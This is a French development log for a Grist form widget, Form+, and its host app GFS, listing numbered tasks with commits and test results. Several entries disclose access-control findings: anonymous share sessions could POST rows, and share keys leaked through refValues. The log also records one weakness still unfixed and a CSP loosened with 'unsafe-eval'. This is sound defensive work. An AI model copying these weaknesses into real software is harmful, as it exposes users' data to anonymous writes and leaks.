  suite `#test` en CI locale (`run-widget-tests.js`) 1 032 / 1 032 en FR et en EN, aucun avertissement
  console ; dans le vrai Grist, `e2e-onboarding.js` et `e2e-build-first.js` verts avec le changement.
  Les deux premiers passages, juste après le démarrage à froid du Grist de test, se sont arrêtés sur
  « Recherche de la page du formulaire… » ; non reproduit ensuite (trois passages verts avec le
  changement, un sans), cause non élucidée, sans lien visible avec la 029.
- 028 · lue · aucun code à changer. (1) `_grist_Views.name` : `nameFormPage` écrit déjà `name` seul, dans son
  propre lot, avec le repli « New page » dit tel quel (`poc/js/grist-meta.js`) : rien à toucher. (2)
  `navigator.clipboard.readText` refusé dans un cadre de GFS : le bouton « Coller » retombe déjà sur le
  collage dans le champ du guide. L'adresse de la page à copier (`pageUrlFromBaseUrl`) a été mesurée **hors
  GFS**, dans un vrai Grist 1.7.22 (`e2e-onboarding.js` : l'onglet ouvert est bien la page du formulaire) ;
  pas mesurée avec l'adresse du jeton et l'`instance` de GFS, ni dans Firefox. (3) Tes deux autres demandes
  (ouvrir une page hors du cadre, Leaflet) attendent le porteur : je garde « Copier l'adresse de la page »
  dans GFS et le chargement autonome de Leaflet hors GFS, sans rien changer d'ici là.
- 027 · lue · aucun code à changer. Form+ n'écrit, ne lit et n'a jamais écrit aucune colonne
  `Auteur`, `Visibilite`, `Personnes` ni `Espace` (vérifié : aucune occurrence dans `poc/js/`) -
  `GFS_Auteur` et les autres colonnes `GFS_…` restent tolérées sans y toucher. Pour le refus
  d'écriture annoncé (« Blocked by row update access rules ») une fois le partage activé : les deux
  nouveaux appels qui ÉCRIVENT dans un fichier `FormPlus_Formulaires` au nom de la personne
  (`GfsLink.onDelete`/`onDuplicate`, consignes 020/021) attrapent déjà toute erreur et répondent
  `{fait:false}`/`{dit:…}` à GFS plutôt que de planter ou de réessayer (`try`/`catch`, main.js) ;
  `saveConfig` (l'enregistrement normal d'un formulaire dans l'éditeur) fait de même depuis
  longtemps, affiche « non enregistré » plutôt que de planter. Pas encore vérifié un par un : les
  autres écritures de l'éditeur (nouvelle question, nouvelle colonne…) suivent le même chemin
  (`saveConfig`), jamais essayées précisément sous un partage actif en lecture seule - à affiner si
  GFS le rejoue et trouve un plantage.
- 026 · lue · faite · `886c550` · point 3 pris : pas de fenêtre d'accord pour la table de la copie,
  mais `dit` le dit. L'hypothèse de GFS est le choix de Form+ : une fenêtre à l'appel `dupliquer`
  attendrait un clic sur un écran pas forcément affiché (l'appel vient de l'explorateur, pas
  forcément de Form+ au premier plan) - elle resterait invisible, et GFS abandonnerait l'appel au
  bout de 20 s en disant à la personne que Form+ ne répond pas, pire que l'absence de fenêtre. Le
  geste « Dupliquer » lui-même, déjà demandé explicitement sur un formulaire dont la personne sait
  qu'il a sa table de réponses, en tient lieu. `duplicateManagedForm` rend maintenant aussi le nom
  de la nouvelle table ; `dit` le dit (« Elle n'est pas publiée. Ses réponses iront dans une
  nouvelle table, « … », vide. »), pour que la personne le sache sans avoir à cliquer. Rejeu
  mesuré par GFS (25 vérifications, FR/EN, aucune en échec) pris en compte, rien à corriger côté
  Form+ au-delà du point 3.
- 024 · faite · lue · `a8307be` · le kit répond à « supprimer » et « dupliquer » (0.10.0).
  `kit/` relevé à `cb1f8cd` (0.10.0) : `GfsLink.onDelete`/`onDuplicate` existent, exactement le
  crochet par geste que la carte du 06/11 avait choisi (même mécanisme que `onClose`, 0.9.0).
  020 et 021 ci-dessous, faites dans le même lot.
- 021 · faite · `7057309` · copie un formulaire en entier, sans le publier. `GfsLink.onDuplicate`
  (main.js) appelle `duplicateManagedForm` (grist-meta.js) : copie la section native (une page
  TOUTE NEUVE, donc sans aucune clé de partage - jamais publiée), la Définition (sous le nom déjà
  calculé par GFS) et les questions, avec sa PROPRE table de réponses, VIDE (jamais celle de
  l'original, pour ne jamais y mélanger une réponse déjà reçue avec une réponse à venir de la
  copie). La copie reprend : ses questions, les colonnes de sa table principale (texte, nombre,
  case, pièce jointe, et la colonne Référence cachée d'une question « Choix depuis une table »,
  type compris) ; elle NE reprend PAS : les réponses déjà reçues par l'original (table neuve),
  et - limite connue - une question qui écrit dans une AUTRE table que la table principale (combo
  « Écrire dans » de l'éditeur) continue de viser cette même autre table, partagée avec
  l'original. La personne republie la copie elle-même, comme tout formulaire parti de zéro
  (Publier dans Grist, puis coller son lien dans Form+). Vérifié en conditions réelles (Grist
  Docker, `tests/grist-env/`) : `AddTable` accepte bien un type `Ref:<table>` dans sa liste de
  colonnes (jamais exercé ailleurs dans ce dépôt - `ensureChoiceField` ne crée les siennes que par
  `AddColumn`), la nouvelle table reste à 0 ligne après la copie, et l'original ne reçoit aucune
  écriture.
- 020 · faite · `7057309` · ferme le lien public avant la corbeille. `GfsLink.onDelete` (main.js)
  appelle `closeManagedFormPublicLink` (grist-meta.js) : dépublie la section native du formulaire
  (`shareOptions` remis à `{}`, même mécanisme que la dépublication existante) - rien d'autre :
  jamais la ligne de `FormPlus_Formulaires` (GFS la garde, pour la restaurer), jamais
  `FormPlus_Pub_<vsId>` et ses réponses, jamais la définition. Idempotent (rappelable sans rien
  écrire de plus si déjà fermé) ; répond vrai aussi si la ligne ou sa section n'existent déjà
  plus (rien à bloquer). Vérifié en conditions réelles (même essai que la 021) : la section
  redevient bien privée, la ligne reste présente.
- 023 · faite · lue · `bf0ddce` · l'attente d'ambiance arrive après la première image. Mesuré par
  GFS : `[data-gfs-pending]`, posé par `poc/js/main.js` (un `<script type="module">`), arrivait à
  76 ms - après la première image à 16 ms, laissant l'éclair des couleurs d'origine (017) entier.
  `poc/js/gfs-pending.js`, un script CLASSIQUE (pas `type="module"`) chargé en `<head>` **avant les
  feuilles**, pose maintenant l'attribut avant que le navigateur ne dessine quoi que ce soit (même
  mécanisme que `js/theme.js` chez Automation+) ; il teste `location.search` par une expression
  volontairement simple (`/[?&]gfs=\d/`), ne pouvant pas importer `hostContract` du kit (un module
  ES). `main.js` garde le seul rôle de retirer l'attribut (`ambiance.ready`, ou 2 s de repli),
  **sans condition** cette fois : retirer un attribut absent ne fait rien, ce qui évite tout écart
  entre les deux tests. Vérifié en conditions réelles (Playwright, observateur posé avant la
  navigation) : l'attribut est posé à 7 ms, avant la première image mesurée à 26 ms dans ce même
  essai.
- 022 · faite · lue · (déjà `1d71b1d`, la 019) · le kit répond à « fermer » (0.9.0). `kit/` est à
  `eaa2ae2` (0.9.0) depuis la 019, et `GfsLink.onClose`/`onOpen` (main.js) portent déjà la règle
  de la 019 (rien en attente sur `#config` : vrai aussitôt ; une réponse en cours sur `#fill` :
  la question Quitter sans envoyer/Annuler). Rien de plus à faire.
- 019 · faite · lue · `1d71b1d` · réponds à « fermer » : enregistre avant de laisser la place à
  une autre app. Ce que Form+ a « en attente » : sur `#config` (le concepteur), rien - chaque
  champ s'écrit tout de suite dans la section widget, pas de bouton « Enregistrer » (déjà vrai
  depuis la 012, GfsLink.onOpen le disait déjà). Sur `#fill` (le répondant, mode interne dans
  GFS), en revanche : une réponse commencée ne s'écrit qu'à l'envoi (`onSubmit`), donc tant que
  la personne n'a pas cliqué sur le bouton d'envoi, rien n'est encore enregistré. Sous-module
  `kit` relevé à `0.9.0` (`eaa2ae2`, GfsLink.onClose). `GfsLink.onClose`/`onOpen` (main.js)
  répondent `{ferme:true}` aussitôt sur `#config` ; sur `#fill` avec une réponse en cours
  (`hasPendingFillAnswers`, respond.js), une question (Quitter sans envoyer / Annuler - pas
  d'« Enregistrer » : Form+ n'a aucun brouillon à garder) avant de répondre, `{ferme:false}` si
  la personne annule, réponse intacte. Même règle pour `ouvrir` un autre fichier de Form+ pendant
  qu'une réponse est en cours. 847 vérifications hors ligne (FR+EN, aucun avertissement) :
  `hasPendingFillAnswers` distingue `#fill` masqué/sans réponse/avec une réponse commencée.
  Vérifié aussi en conditions réelles (Playwright, le protocole `fermer` de GFS rejoué dans une
  iframe contre le vrai widget) : `{ferme:true}` immédiat sur `#config`, une vraie fenêtre de
  confirmation qui bloque la réponse à GFS tant que `#fill` a une réponse en cours, `{ferme:false}`
  sur Annuler avec la réponse intacte, `{ferme:true}` sur « Quitter sans envoyer ».
- 018 · faite · `6c79698` · ta politique de sécurité bloque l'eval du script de Grist. Le fichier
  que sert `docs.getgrist.com` s'évalue par `eval()` ; `poc/widget.html` ne l'autorisait pas
  (`EvalError: call to eval() blocked by CSP`, vu par le porteur le 04/11 dans le Grist de la
  DINUM - Form+ restait bloqué sur « Connexion à Grist… », jamais « prête »). `script-src` ajoute
  `'unsafe-eval'` (raison dans le commentaire au-dessus de la politique) et nomme l'adresse
  entière du script (`https://docs.getgrist.com/grist-plugin-api.js`), pas seulement son origine,
  comme GFS/Publipostage+/Automation+ (guide des apps, règle 11). Point 3 (en option) fait : 
  `isPluginApiReady()` (`plugin-loader.js`) vérifie `window.grist && typeof window.grist.ready
  === 'function'` avant de résoudre - `loadPluginApi()` résout maintenant `null` (chargé mais
  planté à l'exécution) plutôt que `true` à l'aveugle, et `main.js` l'affiche dans le diagnostic
  de l'écran « standalone » (nouveau `#diag-standalone`, `event: "pluginApiBroken"`) au lieu de
  planter en silence sur `grist.ready()`. `tests/grist-env/README.md` fait maintenant servir
  `grist-plugin-api.js` enveloppé dans `eval(...)`, pour que ce banc voie la même panne qu'un
  vrai `docs.getgrist.com` (le script d'un Grist Docker n'évalue rien). 844 vérifications hors
  ligne (FR+EN, aucun avertissement) : la CSP garde les deux éléments exigés, `isPluginApiReady`/
  `loadPluginApi` distinguent bien « planté » de « prêt ». Vérifié aussi en conditions réelles
  (Playwright, le script réellement enveloppé dans `eval(...)`, dans une iframe) : `grist.ready()`
  est bien appelé avec la CSP corrigée ; et, à l'inverse, un script qui plante vraiment à
  l'exécution fait maintenant afficher `#standalone` avec la cause visible dans son diagnostic,
  au lieu de rester bloqué sur « Connexion à Grist… ».
- 017 · faite · lue · `6c79b62` · le rejeu de l'ambiance avec ta vraie app. Rejeu confirmé (015 à
  `01ddd10`, 016 à `954483a`) : contraste 4,5:1 au moins tenu sur les 56 mesures de chaque passe
  (FR/EN × clair/sombre), aucune en échec ; aucune autre table/colonne/clé/bibliothèque/permission/
  adresse CSP de l'app n'a changé pour GFS. L'éclair des couleurs d'origine mesuré (66 à 100 ms
  avant l'ambiance, dans le labo de GFS) n'était pas une obligation du guide ("à toi d'en faire ce
  que tu veux") - retenu quand même, repris du mécanisme d'Automation+ : `main.js` pose
  `[data-gfs-pending]` sur `<html>` SEULEMENT dans GFS (`hostContract(location.search)` non nul,
  mesuré tout de suite, avant `Ambiance.start()`), `widget.css` cache le corps tant que l'attribut
  est là, et `main.js` le retire dès que `Ambiance.start().ready` se règle, ou après 2 s si GFS
  tarde ou que `kit/` manque ; jamais posé hors GFS, où rien n'attend. 836 vérifications hors
  ligne (FR+EN, aucun avertissement console) : `hostContract` ne déclenche le cache que sur une
  adresse GFS valide, la règle CSS cache bien le corps puis le relâche. Vérifié aussi en conditions
  réelles (Playwright, `?gfs=1` hors iframe) : l'attribut est bien posé puis retiré dès que
  l'ambiance se règle, jamais laissé en place.
- 016 · faite · `954483a` · suivre l'ambiance de GFS. Sous-module `kit` de `c0c8660` à `8afa569`
  (0.3.0 liens entre apps, 0.4.0 identité, 0.5.0 sélecteur de couleur, 0.6.0 l'ambiance).
  `Ambiance.start()` posé une fois dans `main.js`, à côté de `Theme.init`. Les feuilles de
  l'éditeur (`poc/css/widget.css`) lisent les jetons de forme (guide des apps, règle 15) avec leur
  valeur d'origine en repli (`var(--radius-md, 10px)`) : rayons (`--radius-md/-sm/-btn/-input/-pill`),
  trait des contrôles et cartes (`--bw`), ombre des panneaux et menus flottants (`--shadow-panel`,
  `--shadow-float`), bouton plein (`--fill`, un dégradé chez Pop), police/casse des titres et
  étiquettes (`--font-head`/`-label` et leurs compagnons, hors `--fs-head` qui écraserait la
  hiérarchie h1>h2>h3). **Jamais dans `#fill` ni `.pv-*`** : l'aperçu et l'écran du répondant
  gardent l'aspect dessiné par la personne, jamais celui de GFS (même principe que `--accent*` via
  `applyBranding`). Pas d'équivalent retenu ici : `--avatar-*`, `--bar-w`, `--stripe*` (aucun
  élément correspondant dans l'éditeur) ; 2 catégories de l'exception couleur (état, type) n'ont
  aucune occurrence en dur dans `widget.css` (déjà des jetons `--good`/`--danger-ink`), seule
  reste celle « ce que tu produis » (`#qrCanvas`, le QR code lui-même, doit rester blanc pur).
  829 vérifications hors ligne (FR+EN, aucun avertissement console) : le message d'exemple du kit
  (`kit/test/ambiance-exemple.json`) change bien le fond, une carte et le bouton plein, et les
  rend avec `null` ; un essai refuse toute couleur écrite en dur hors de cette unique exception.
  Vérifié aussi visuellement (Playwright, ambiance Pop, avant/après).
- 015 · faite · `01ddd10` · un lien public ne lit que les petites tables `FormPlus_Pub_*`. Depuis
  le 03/11, GFS refuse sans fenêtre toute autre table de l'app lue par un lien public -
  `FormPlus_Formulaires` en tête (elle garde `shareKey`/`formLink`/`publicUrl` de tous les
  formulaires). `isFormPlusOwnTable` (`grist-meta.js`) écarte les tables `FormPlus_…` des trois
  listes de `config-editor.js` qui offraient `listTables()` en entier : « Partir de zéro » > une
  table existante (`scratchExistingCombo`), la source d'une question « Choix depuis une table »
  et sa table de réception (`srcTable`/`writeTable`). Le préfixe `FormPlus_Pub_` reste intouché
  (contrat avec GFS). 820 vérifications hors ligne (FR+EN) : un essai par liste, qui échoue sur
  l'ancien code.
- 014 · faite · `f9dcb81` · ton site en ligne reste publié : `.nojekyll` à la racine, vérification
  à chaque lot. `.nojekyll` ajouté à la racine de `main` (sinon GitHub Pages passe tous les `.md`
  du dépôt par Jekyll avant publication, et une seule accolade double non fermée dans l'un d'eux
  ferait échouer la publication en silence). Les deux vérifications demandées ajoutées au
  protocole de test manuel (`tests/README.md`). Vérifié pour ce lot le 2026-11-02 : le run « pages
  build and deployment » du commit `f9dcb81` est vert (`run #90`,
  https://github.com/lombre33/FormPlus/actions/runs/41519501616) ; un détail de ce lot est bien en
  ligne (la nouvelle section de `tests/README.md` est servie telle quelle à
  `https://lombre33.github.io/FormPlus/tests/README.md`, et les clés `form.editor.sourceOnWidgetPage`
  / `form.editor.staleGateTitle` du lot précédent sont dans `poc/js/strings.js` en ligne). Form+
  n'affiche pas de numéro de version dans l'app ; faute de ce repère, cette vérification se fait en
  cherchant un détail du lot (texte, clé) directement dans un fichier servi par Pages.
- 013 · faite, avec une limite connue (point 2) · `df2dc1e` · les liens publics : un lien ne montre
  et n'ouvre que son formulaire.
  1. **Un lien ne montre que son formulaire.** Mesuré sur un vrai Grist (`tests/grist-env/`, une
     clé de partage réelle) : le lien d'un formulaire A rendait, via `refValues`, la `Definition`
     de **tous** les formulaires de `FormPlus_Formulaires` - `shareKey`, `formLink` et `publicUrl`
     compris, pour qui avait un seul lien. Cause : une colonne cachée `FormPlusDef` unique,
     partagée par tous les formulaires, vers la table partagée. Corrigé : chaque formulaire publié
     a maintenant sa propre table d'une seule ligne (`FormPlus_Pub_<vsId>`) et sa propre colonne
     cachée (`FormPlusDef_<vsId>`), jamais partagées - `refValues` ne peut plus contenir que la
     ligne de CE formulaire (`ensureRespondentDefinitionField`, `grist-meta.js`). Retire aussi tout
     autre champ-définition de Form+ hérité sur la section (un formulaire natif posé après coup sur
     une colonne héritée d'un autre formulaire, voir aussi 012 point 5 ci-dessous).
  2. **Une porte, sa table de réception.** Mesuré : une clé de partage ouvre l'écriture dans
     TOUTES les tables visées par une section de formulaire publiée sur SA page, pas seulement
     celle visée par le lien précis utilisé pour y entrer - jamais deux formulaires sur le même
     partage. Fait : « Partir de zéro » pose sa section sur une page TOUTE NEUVE
     (`createFormSectionOnNewPage`, jamais la page du widget ni celle d'un autre formulaire) ;
     coller un lien vers une page déjà gérée par un AUTRE formulaire FormPlus est refusé avant
     toute duplication (`otherManagedFormOnPage`). **Limite connue, pas encore corrigée** : coller
     le lien d'un formulaire natif déjà publié (`duplicateFormSection`) pose la copie sur la MÊME
     page que ce formulaire natif, en réutilisant sa clé déjà en place - le formulaire natif
     d'origine reste lui-même publié sur cette page, donc cette même clé ouvre aussi l'écriture
     dans sa table. Le corriger reviendrait à fermer le lien natif de la personne (son `UpdateRecord`
     sur `shareOptions` est le seul moyen disponible, `RemoveViewSection` n'étant pas un verbe que
     GFS laisse passer, voir point 7 de la 012) : question posée à la personne (carte de décision),
     réponse en attente à la date de cette page. Aucune table ne porte de colonne de gestion que le
     lien pourrait remplir sans la montrer (vrai par construction, rien à corriger).
  3. et 4. **Dire ce que le lien ouvre, refus = rien à moitié fait.** `generate()` est le seul
     endroit de l'app qui rend quelque chose de nouveau public (`duplicateFormSection` publie la
     copie tout de suite, sous la clé déjà en place) : une fenêtre y dit maintenant, avant de
     publier, la table qui reçoit des lignes (colonnes montrées et cachées) ; elle est posée AVANT
     toute duplication, donc un refus ne crée ni ne publie rien (rien à retirer). Pas encore fait
     pour la question « Choix depuis une table » qui écrit dans une AUTRE table
     (`ensureTableGate`, déjà appelée en cours d'édition d'un formulaire déjà publié) : cette
     fenêtre-là n'existe pas encore, seulement un comportement inchangé. Hors GFS (app seule,
     comme ici), cette fenêtre est la seule confirmation - pas facultative.
  5. **Une ligne reçue par un lien est un texte non fiable** : déjà le cas partout où une réponse
     est affichée (`esc()`, `config-editor.js`, testé - voir `formatResponseValue`) ; rien de
     nouveau à faire ici.
  6. **Documents déjà publiés** : rien n'est refermé sans la personne. Signalés au prochain
     enregistrement par le point 7 de la 012 ci-dessous (l'ancien portillon, pas ce point-ci) ;
     aucun autre mécanisme de signalement propre à la 013 pour l'instant.
  812 vérifications hors ligne, toujours vertes (FR+EN, aucun avertissement console), chacune
  échouant sur le code d'avant son correctif.
- 012 · faite (points 2, 3, 4, 5, 6, 7 ; 1 et 8 informationnels) · `16cf6b1` · ta page du 22/10,
  `c249c4a` mesuré dans GFS, six points à reprendre :
  1. Informationnel, rien à faire.
  2. **Le formulaire natif posé sur la page de TON widget : la ligne n'était jamais écrite**
     (« Partir de zéro », ou toute personne qui pose son widget à côté de son formulaire) - ajouter
     une section à une page recharge tous ses cadres de widgets personnalisés (comportement natif
     de Grist), avant que `saveConfig` n'ait écrit la ligne : chaque essai laissait une copie
     orpheline de plus, sans jamais rien enregistrer. Corrigé en détectant ce cas (`samePage`, déjà
     calculé par `findViewRefForSection`) et en refusant clairement AVANT toute duplication, plutôt
     que de laisser cet échec silencieux se reproduire (le même risque, pour « Partir de zéro »,
     est déjà fermé par la 013 point 2 : sa section part sur une page neuve, jamais celle du
     widget).
  3. **« Changer de formulaire source » disparaissait** : le bouton vivait dans le
     `<p data-i18n="form.settings.urlDesc">` de `widget.html`, vidé de tout contenu par
     `translateDom` (kit) une seconde après l'ouverture. Sorti dans son propre paragraphe, à côté.
  4. **« Nouveau »** : au tout premier chargement du cadre, `onOptions` (`main.js`) ne lisait pas
     `raison: 'nouveau'` de la porte "ouvrir" de GFS (`GfsLink.opening()`) et retombait sur le
     formulaire gardé ouvert (`GFS_OPEN_ROW_KEY`) ou `resolveMyDefinition()`, ambiguë dans GFS -
     corrigé, `raison: 'nouveau'` décide avant les deux. Cadre déjà ouvert : l'écran de départ
     s'affichait bien, mais l'éditeur du formulaire précédent restait affiché dessous
     (`showConfig()` ne cachait `#editor` que par le bouton du point 3) - `showConfig()` le cache
     maintenant lui-même par défaut, montré seulement si la section liée existe réellement.
  5. **Le champ caché du second formulaire restait visible** : déjà réglé par l'architecture de la
     013 point 1 (une colonne `FormPlusDef_<vsId>` propre à chaque formulaire ne peut plus être
     héritée d'un autre formulaire du même type sur la même table) ; la 013 point 1 retire en plus
     explicitement tout autre champ-définition hérité trouvé sur la section.
  6. **Le mode interne créait `FormPlus_Repondants` sans fenêtre d'accord**, contrairement à
     `FormPlus_Formulaires` - même fenêtre du kit ajoutée (`ensureRespondentProbeTable`,
     `grist-meta.js`).
  7. **Un document déjà touché par `038dd1b` peut garder le portillon que la 008 a retiré du
     code.** `ensureFormulairesTable` détecte maintenant une section Formulaire encore publiée
     visant `FormPlus_Formulaires` et, avec l'accord de la personne, la DÉPUBLIE (jamais ne la
     supprime : `RemoveViewSection` n'est pas un verbe que le courtier de GFS laisse passer,
     `contrats.md` 3.3 point 2 - le même `UpdateRecord` sur `shareOptions` qui publie une section
     ailleurs dans ce module suffit à faire disparaître le même risque). Un refus laisse la porte
     comme avant, sans bloquer le reste de `generate()`.
  8. Informationnel, rien à faire.
  812 vérifications hors ligne (même suite que la 013 ci-dessus), toujours vertes (FR+EN, aucun
  avertissement console), chacune échouant sur le code d'avant son correctif. Les points 2 à 6 se
  voyaient aussi dans l'app seule (hors GFS) : testés sans dépendre de GFS.
- 008 · faite · `c249c4a` · ta page du 21/10 (soir) répondue point par point :
  1. **L'enregistrement qui ne passait pas.** `ensureFormulairesTable`/`ensureTableGate` posait sa
     section de garde pour `FormPlus_Formulaires` sur la page du WIDGET (`widgetPage`), qui recharge
     ce cadre dès que la section est créée - exactement le fait que ta page donnait. Corrigé : la
     section de garde se pose maintenant sur la page du FORMULAIRE NATIF
     (`state.currentFormSection.viewRef`, le même repère déjà utilisé pour les tables secondaires
     d'une question "Choix depuis une table") - elle ne recharge jamais le cadre du widget, et
     réutilise la clé de partage déjà posée par le bouton natif "Publier" sur cette page (jamais
     republiée à la main). Un second "Générer" retrouve la section déjà publiée, n'en pose jamais
     une de plus.
  2. **Une ligne par formulaire.** `saveFormDefinition` retrouvait sa ligne par `IdSectionWidget`
     (la section qui héberge CE widget) : dans GFS, toutes les instances de Form+ partagent la
     MÊME section hôte, donc un second formulaire réécrivait la ligne du premier. Corrigé : la
     ligne se retrouve maintenant par `Definition.vsId` (propre à chaque formulaire, dans GFS comme
     hors GFS), mis en cache (`state.formRowVsId`/`formRowTitle`) pour ne rescanner la table qu'au
     changement de formulaire. `IdSectionWidget` reste écrit (diagnostic, repli hors GFS) mais ne
     sert plus à choisir la ligne. 2 formulaires faits dans GFS ont maintenant 2 lignes
     indépendantes, testé hors ligne (`tests.js`, groupe "une section hôte partagée (GFS) donne
     quand même une ligne par formulaire").
  3. **Les répondants, mesuré sur un vrai Grist** (Docker `gristlabs/grist:latest`, site d'équipe,
     document réel, formulaire publié, lien de partage réel - jamais grist-static) : ta lecture du
     code de Grist est confirmée à la lettre. Une session de partage anonyme qui lit
     `FormPlus_Formulaires` (table ou REST `/api/s/<clé>/tables/.../records`) reçoit `{"records":
     []}` quelle que soit la ligne existante (restreint à `rec.id==0`) ; la même session PEUT y
     ajouter une ligne quelconque, toutes colonnes, par un simple `POST .../records` - vérifié en
     injectant une ligne factice, relue ensuite côté concepteur. `ensureTableGate` sur cette table
     n'apportait donc aucun bénéfice (ni le 007 ni le 008 n'en ont profité), seulement ce risque :
     **retirée** (plus de portillon posé pour `FormPlus_Formulaires`). À la place,
     `ensureRespondentDefinitionField` (`grist-meta.js`) pose une colonne Référence CACHÉE
     (`FormPlusDef`) sur la table cible du formulaire natif, vers `FormPlus_Formulaires`, affichant
     sa colonne `Definition`, ajoutée comme champ masqué (`formIsHidden`) sur la section publiée -
     exactement le mécanisme déjà utilisé pour "Choix depuis une table" (`ensureChoiceField`), déjà
     éprouvé : Grist expose alors son `refValues` (les lignes de la table visée, avec leur colonne
     affichée) dans la réponse PUBLIQUE de `/forms/<clé>/<section>`, jamais par une lecture de table.
     Vérifié en conditions réelles sur le Grist Docker : un champ caché `FormPlusDef` posé à la main
     sur le formulaire natif `Reponses`, pointant vers `FormPlus_Formulaires` (affichage `Definition`)
     rend bien la Définition complète de la ligne existante, en anonyme, via ce `refValues` - la
     même chose que fait désormais `respond.js` (`renderFill`) pour construire l'écran répondant.
     La ligne qu'un visiteur ajouterait toujours (point 2 ci-dessus, `+C`) n'apparaît elle jamais
     dans l'explorateur de GFS pour autant qu'il liste par la Définition qu'il lit, pas par une
     simple présence de ligne - à confirmer de ton côté si l'explorateur affiche autre chose qu'une
     ligne avec Definition correctement formée.
  4. **Une ligne par formulaire, reste de ton point 4** : la porte "ouvrir" (consigne 010,
     `GfsLink.opening()`/`fichier.id`) donne maintenant l'identifiant de ligne à ouvrir - voir 010.
  8. **Rangement/renommage par les fichiers de GFS** : voir 009.
- 009 · faite · `c249c4a` · `saveFormDefinition` ne met `Nom` dans son lot que pour une ligne tout
  juste créée (`AddRecord`), ou quand le titre (`formTitle`) a changé dans Form+ depuis la dernière
  lecture ou écriture (`state.formRowTitle`, comparé à la ligne existante au premier enregistrement
  d'une session) ; sinon `Nom` reste hors du lot. Le choix pris en attendant (le plus prudent, comme
  ta page le proposait) : le nom donné dans GFS reste celui du fichier, distinct du titre affiché
  aux répondants - renommer dans GFS ne change donc rien à ce qu'ils voient.
- 010 · faite · `c249c4a` · sous-module `kit/` à `c0c8660`. `GfsLink` (`poc/js/main.js`,
  `poc/js/links.js`) :
  - **Ouverture au démarrage** : `GfsLink.opening()?.fichier.id` (l'identifiant d'une ligne de
    `FormPlus_Formulaires`) charge directement cette Définition (`loadDefinitionByRowId`,
    `grist-meta.js`) et ouvre l'éditeur sur ce formulaire, à la place de l'écran de départ habituel.
  - **Double-clic pendant que Form+ tourne déjà** : `GfsLink.onOpen`. Form+ enregistre à chaque
    champ (pas de bouton "Enregistrer") : jamais de question "modifications en attente", on ouvre
    directement le nouveau formulaire (ou l'écran de départ pour "Nouveau").
  - **La langue** : choix pris, `GfsLink.onLanguage(() => location.reload())` - un rechargement
    plutôt qu'une retraduction en direct, trop de texte de Form+ passant par `I18n.t()` en dehors
    de `translateDom()` (messages, fenêtres du kit) pour garantir une reprise fidèle sans revue
    exhaustive de tout le code. Le formulaire ouvert avant le rechargement se retrouve lui-même
    (`GfsLink.storageGet('formplus_open_row')`, posé à chaque ouverture/enregistrement), puisqu'un
    cadre rechargé n'a plus d'ouverture à donner.
  - **Le thème** : la bascule envoie aussi `GfsLink.storageSet('formplus_theme', Theme.choice ===
    'system' ? null : Theme.choice)` ; au démarrage, `GfsLink.storageGet('formplus_theme')` est
    appliqué par `Theme.set` avant tout le reste.
  - **La page** : `myPageFromReferrer()` (`links.js`) retombe sur `GfsLink.context()?.page` quand
    le référent ne la donne pas - un seul point de repli, utilisé par les trois fonctions qui en
    dépendaient déjà (`findMyWidgetPage`, `findViewRefForSection`, `findMySection`).
  - Non mesuré de notre côté (pas d'accès à un vrai GFS) : à toi de rejouer `run-form`/tes propres
    essais avec ce commit.
- 011 · faite · `c249c4a` · `GfsLink.onBar` (appelé aussi une fois au démarrage avec `GfsLink.bar()`)
  pose quatre variables CSS (`--gfs-bar-top/bottom/left/right`, `0px` par défaut) sur `<html>`, lues
  par `.wrap` (`widget.css`) - le conteneur commun aux trois écrans (concepteur, répondant, départ),
  pour un seul point d'ajustement. Barre en haut : `zone.y + zone.hauteur` de marge en plus en haut
  (pousse tout sous la barre, onglets compris). Barre en bas : `epaisseur` en plus en bas (le
  rembourrage existant, 60px, garde déjà de la marge au défilement, l'addition la préserve). Barre à
  gauche/droite : `epaisseur + 8px` de ce côté. `bar === null` (explorateur ouvert, ou l'app seule)
  remet les quatre à 0. Non mesuré de notre côté (pas d'accès à un vrai GFS pour rejouer
  `run-barre-apps`) : à vérifier aux quatre bords avec ce commit.

## Consignes (001-007)
- 001 · faite · `8a0bf20` · écarts à la 1.1 dès maintenant : règle 2 (config dans les réglages de
  la vue), règle 5 (`document.referrer`), règle 11 (aucune CSP) ; une ligne du guide corrigée
  (attribution `config-editor.js`/`grist-meta.js`) — reprise et complétée par la 003.
- 002 · faite · lue
- 003 · faite · lue
- 004 · faite · `196734d` · licence passée à la GPL 3.0 (empreinte `LICENSE` vérifiée)
- 005 · faite · `90958ac`…`952fe4c` · kit référencé et pleinement intégré : jetons de charte et
  fenêtres du kit sur tout le widget, thème délégué à `Theme`, traduction FR/EN complète de
  l'interface (designer et répondant) via `I18n`, `Dialogs` du kit à la place de `prompt()`/
  `confirm()`. Tests : 542/542 verts, rejoués en entier en `fr-FR` et en `en-US`
  (`.github/scripts/run-widget-tests.js`), et désormais mis en échec par tout `console.warn` (pas
  seulement `console.error`) pour attraper un double chargement du kit, une clé i18n inconnue,
  redéfinie ou manquante — exactement les risques listés par la 005. Vérification manuelle sur un
  vrai Grist local (écran répondant, thème clair/sombre, FR/EN, fenêtre 700×400) : rendu et bascule
  de thème corrects, zéro erreur/avertissement console, contre un vrai formulaire natif publié.
  L'écran concepteur (`#config`/`#editor`) reste hors de portée de cette vérification précise :
  ce bac à sable cloud bloque `docs.getgrist.com`, d'où `grist-plugin-api.js` est chargé — mais il
  est déjà couvert par les 542 tests automatisés (API Grist simulée, mêmes deux langues).
- 006 · faite · lue · GFS a relu et mesuré la 005 dans un vrai Grist (grist-static, écran
  concepteur inclus, 25 vérifications × 4 combinaisons thème/langue, aucun échec) : merci. Erreur
  de la 005 sur l'étiquette `v0.1.0` du kit corrigée par GFS (le dépôt n'en a pas, la référence
  reste le commit `54c48f3`, rien à bouger chez nous) — question retirée ci-dessous. Les deux
  dernières couleurs en dur de `widget.css` (`.toggle-thumb`, `.pv-q`) remplacées par
  `--shadow-card`/`--shadow-float` du kit, commit `39e0740`.
- 007 · faite · `038dd1b` · la définition de chaque formulaire vit maintenant dans une table
  du document, **`FormPlus_Formulaires`**, une ligne par formulaire, colonnes :
  - `Nom` (Text) — le titre du formulaire.
  - `TypeFormulaire` (Text) — toujours `formulaire` (le manifeste).
  - `DateModif` (DateTime) — horodatage de la dernière sauvegarde, en secondes.
  - `ModifiePar` (Text) — toujours `Form+` aujourd'hui : aucune méthode de l'API plugin ne rend
    l'identité de la personne connectée (vérifié dans `prototype/js/demo.js`,
    `prototype/labo/run-form.mjs` : même GFS n'a qu'un nom statique). Dès qu'un client du courtier
    l'expose (point 4 de la 007), cette colonne prendra la vraie identité.
